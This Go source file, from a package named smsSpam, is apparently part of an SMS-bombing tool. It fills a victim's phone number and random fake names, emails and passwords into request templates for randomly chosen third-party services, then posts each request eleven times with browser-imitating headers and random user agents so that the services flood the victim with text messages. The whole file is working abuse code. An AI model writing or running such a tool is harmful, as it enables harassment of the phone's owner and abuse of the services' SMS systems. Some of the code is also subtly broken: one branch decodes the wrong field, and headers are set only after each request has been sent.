package smsSpam

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func parse(phone string, service map[string]string) (map[string]string, string) {
	dataType := ""

	payload := map[string]string{"url": service["url"]}
	if _, exist := service["data"]; exist {

		json.NewDecoder(bytes.NewBuffer([]byte(service["data"]))).Decode(&payload)
		dataType = "data"
	} else if _, exist := service["json"]; exist {
		json.NewDecoder(bytes.NewBuffer([]byte(service["data"]))).Decode(&payload)
		dataType = "json"
	}
	for key, val := range map[string]string{
		"'":          "\"",
		`%phone%`:    phone,
		`%phone5%`:   transformNumber(phone, 5),
		`%name%`:     randomName(),
		`%email%`:    randomEmail(),
		`%password%`: randomPass()} {
		for keyP, valP := range payload {
			payload[keyP] = strings.Replace(valP, key, val, -1)
		}

	}
	return payload, dataType
}
func encodeURLValues(params map[string]string) url.Values {
	v := make(url.Values)
	for key, value := range params {
		v[key] = []string{value}
	}
	return v

}
func SendRequest(phone string) error {
	service := randomService()
	payload, dataType := parse(phone, service)
	headers := map[string]string{

		"X-Requested-With": "XMLHttpRequest",
		"Connection":       "keep-alive",
		"Pragma":           "no-cache",
		"Cache-Control":    "no-cache",
		"Accept-Encoding":  "gzip, deflate, br",
		"User-agent":       randomUserAgent(),
	}
	if _, exist := service["headers"]; exist {
		json.NewDecoder(bytes.NewBuffer([]byte(service["headers"]))).Decode(&headers)

	}
	client := http.Client{Timeout: time.Second * time.Duration(timeout)}
	switch dataType {
	case "data":
		for i := 0; i <= 10; i++ {

			req, err := client.PostForm(service["url"], encodeURLValues(payload))
			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}
		}

	case "json":
		for i := 0; i <= 10; i++ {
			req, err := client.Post(service["url"], "application/json", bytes.NewBuffer([]byte(payload["json"])))
			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}
		}

	case "url":
		for i := 0; i <= 10; i++ {
			req, err := client.Post(payload["url"], "", nil)
			if err != nil {
				return err
			}
			for key, val := range headers {
				req.Header.Set(key, val)
			}

		}
	}
	return nil
}
